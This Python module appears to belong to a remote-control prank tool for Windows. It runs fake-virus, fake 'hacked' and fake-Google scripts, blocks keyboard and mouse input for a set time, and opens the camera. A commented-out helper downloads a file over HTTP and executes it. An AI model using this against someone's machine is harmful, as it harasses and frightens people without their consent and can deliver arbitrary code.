import ctypes
from ..scripting_interface import *
from ..input_output.block_input import BlockInput, BlockDurationArgs
from ...scripts.vb_scripts.troll import showMessage
from ...scripts.batch_scripts import troll as bt
from ...scripts.vb_scripts import troll as vt
from ...scripts.powershell_scripts import troll as pt
from ..commands import Command, ICommandModule, CommandResult
from pydantic import BaseModel, Field, ValidationError

class MessageBoxArgs(BaseModel):
    title: str
    message: str
    VBS: bool = Field(default=True, description="Use VBS for message box")

class TrollScriptArgs(BaseModel):
    scriptName: str
    blocktime: int = Field(default=0, description="Time to block input after running the script")
    formatText: str = Field(default="", description="Additional format text for the script")

command_arg_map = {
    Command.SHOW_MESSAGE_BOX: MessageBoxArgs,
    Command.RUN_TROLL_SCRIPT: TrollScriptArgs,
    Command.OPEN_CAMERA_APP: None,  # No arguments for this command
    Command.GET_AVAILABLE_SCRIPTS: None,  # No arguments for this command
}

class TrollActions(ICommandModule):
    def __init__(self, block_input: BlockInput) -> None:
        self.block_input = block_input

    def show_message_box(self, args: MessageBoxArgs) -> CommandResult:
        """ Shows a message box; Use VBS = True so that killing the form from task manager doesn't kill the python interpreter"""
        if not args.VBS:
            ctypes.windll.user32.MessageBoxA(0, args.message.encode('utf-8'), args.title.encode('utf-8'), 0)
            return CommandResult(success=True, result="Message box shown.")
        else:
            execute_vb_script(showMessage.format(args.message, args.title))
            return CommandResult(success=True, result="VBScript message box shown.")

    def run_troll_script(self, args: TrollScriptArgs) -> CommandResult:
        """Available Scripts: hacked, eainstaller, virusBox, showMessage
        fakeGoogle, virusAttack, sphereAnimation, cyberAttack, bouncingBall, lockedFile, error, matrix, tree
        """
        batchScripts = {
            "fakegoogle": bt.fakeGoogle, 
            "virusattack": bt.virusAttack, 
            "sphereanimation": bt.sphereAnimation, 
            "cyberattack": bt.cyberAttack, 
            "bouncingball": bt.lockedFile, 
            "error": bt.error, 
            "matrix": bt.matrix, 
            "tree" : bt.tree
        }
        VBScripts = {
            "hacked" : vt.hacked, 
            "eainstaller" : vt.eaInstaller, 
            "virusbox" : vt.virusBox, 
            "showmessage" : vt.showMessage, 
        }
        powershellScripts = {
            "playwindowssoundcontinously" : pt.playWindowsSoundContinously
        }
        if args.scriptName.lower() in batchScripts:
            execute_batch_script(batchScripts[args.scriptName.lower()])
        elif args.scriptName.lower() in VBScripts:
            execute_vb_script(VBScripts[args.scriptName.lower()])
        elif args.scriptName.lower() in powershellScripts:
            execute_powershell_script(powershellScripts[args.scriptName.lower()])
        else:
            return CommandResult(success=False, result="Script not found")
        
        if args.blocktime > 0:
            self.block_input.block_secs(BlockDurationArgs(seconds=args.blocktime))

        return CommandResult(success=True, result="Script executed")

    def open_camera_app(self) -> CommandResult:
        """Opens the camera app."""
        try:
            subprocess.Popen(["start", "microsoft.windows.camera:"], shell=True)
            return CommandResult(success=True, result="Camera app opened.")
        except Exception as e:
            return CommandResult(success=False, result=f"Failed to open camera app: {str(e)}")

    def get_available_scripts(self) -> CommandResult:
        """Returns the available scripts categorized by script types."""
        available_scripts = {
            "Batch": [
                "fakegoogle",
                "virusattack",
                "sphereanimation",
                "cyberattack",
                "bouncingball",
                "error",
                "matrix",
                "tree"
            ],
            "VBScript": [
                "hacked",
                "eainstaller",
                "virusbox",
                "showmessage",
            ],
            "PowerShell": [
                "playwindowssoundcontinously"
            ]
        }
        return CommandResult(success=True, result=available_scripts)
    
    def run(self, command: Command, args: BaseModel = None) -> CommandResult:
        command_func_map = {
            Command.SHOW_MESSAGE_BOX: self.show_message_box,
            Command.RUN_TROLL_SCRIPT: self.run_troll_script,
        }
        command_func_map_no_args = {
            Command.OPEN_CAMERA_APP: self.open_camera_app,
            Command.GET_AVAILABLE_SCRIPTS: self.get_available_scripts,
        }
        if platform.system() != "Windows":
            return CommandResult(result="This feature is supported on Windows only.", success=False)
        
        if command not in command_func_map and command not in command_func_map_no_args:
            return CommandResult(success=False, result="Command not found.")

        arg_class = command_arg_map[command]
        
        if command in command_func_map:
            try:
                validated_args = arg_class(**args.model_dump())
            except ValidationError as e:
                return CommandResult(success=False, result=f"Argument validation error: {e}")
            return command_func_map[command](validated_args)
        elif command in command_func_map_no_args:
            return command_func_map_no_args[command]()
   
#def change_wallpaper_http(link_to_themepack:str):
 #   if ".themepack" not in link_to_themepack:
  #      return 0
   # try:
    #    _ , name = Download.download_file_http(link_to_themepack, saveTo = TEMP)
     #   subprocess.Popen(os.path.join(TEMP, name), creationflags = subprocess.CREATE_NEW_CONSOLE)
      #  return 1
    #except:
     #   return 0


